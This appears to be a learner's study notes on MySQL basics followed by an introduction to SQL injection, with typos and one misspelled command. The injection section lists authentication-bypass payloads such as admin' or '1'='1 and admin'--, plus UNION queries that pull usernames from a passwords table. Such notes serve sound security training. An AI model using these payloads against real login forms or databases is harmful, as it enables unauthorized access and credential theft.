
# Mysql
## Intro to MySQL

```shell-session
mysql -u root -p
```

```shell-session
mysql -u root -p<password>
```

```shell-session
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

```shell-session
CREATE DATABASE users;
```
`Create an database`

```shell-session
SHOW DATABASES;
```

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```
`Crearing an Table`

```shell-session
SHOW TABLES;
```

```shell-session
DESCRIBE logins;
```
`Gives the structure of the table named login`

## SQL StateMents

### Instert Statements

```shell-session
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```

```shell-session
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

```shell-session
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

### Select Statements

```shell-session
SELECT * FROM logins;
```

```shell-session
SELECT username,password FROM logins;
```

```shell-session
DROP TABLE logins;
```

### ALter Statements

```shell-session
ALTER TABLE logins ADD newColumn INT;
```
`Add an new cloumn to Table`


```shell-session
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```
`Rename an cloumn`

```shell-session
LTER TABLE logins MODIFY newerColumn DATE;
```
`Modify the datatype`

```shell-session
ALTER TABLE logins DROP newerColumn;
```
`Delete an Cloumn`

### UPDATE Statement

```shell-session
UPDATE logins SET password = 'change_password' WHERE id = 1;
```
`Change the password for User with id =1`

## Query Results

### Sorting Results

```shell-session
SELECT * FROM logins ORDER BY password;
```
`Sort the Output in Acending Order`

```shell-session
SELECT * FROM logins ORDER BY password DESC;
```
`Sort the Output in Desending Order`

```shell-session
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

### LIMIT results


```shell-session
SELECT * FROM logins LIMIT 2;
```
`Only Show 2 rows`

```shell-session
SELECT * FROM logins LIMIT 1, 2;
```
`DOn't show the First row then show the next two rows`


### WHERE Clause


```shell-session
SELECT * FROM logins WHERE id > 1;
```

```shell-session
 SELECT * FROM logins where username = 'admin';
```

### Like Clause

```shell-session
SELECT * FROM logins WHERE username LIKE 'admin%';
```
`Retrives Evrthing Starting with admin`

```shell-session
SELECT * FROM logins WHERE username like '___';
```
`Retries all the usernames with three charests in them like(tom)`

## SQL Operators

#### AND Operator


```shell-session
SELECT 1 = 1 AND 'test' = 'test';
```
`Both condition has to be true`

#### OR Operator

```shell-session
SELECT 1 = 1 OR 'test' = 'abc';
```
`Only One Condition needs to be true`

#### NOt Operator

```shell-session
SELECT NOT 1 = 1;
```
`COnverts True to false and vice versa`

#### Symbol Opreator

The `AND`, `OR` and `NOT` operators can also be represented as `&&`, `||` and `!`

```shell-session
SELECT 1 = 1 && 'test' = 'abc';
```

```shell-session
select * from logins where username != 'tom' AND id > 3 - 2;
```


# SQL Injection
## Subverting Query Logic

### Authentication Bypass

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
`Above for Discoverying THe SQLi`

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

### OR Injection

```sql
admin' or '1'='1
```

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
`First the Add opretor Works then the OR operator`


### Auth Bypass with OR operator


## Using Commnets

### Auth Bypass with comments

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

`admin'--`

`admin')--`

## Union Clause

### Union
he [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements.

```shell-session
SELECT * FROM ports UNION SELECT * FROM ships;
```

### Uneven -Union

[Uneven union theory](../../Web%20application%20PenTest/WAPT/SQLi.md)


```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```


```sql
UNION SELECT username, 2, 3, 4 from passwords-- 
```

```
desc table_name
```

```
select * from employees UNION select dept_no,dept_name,1,2,3,4 from departments;
```


### Union Injection

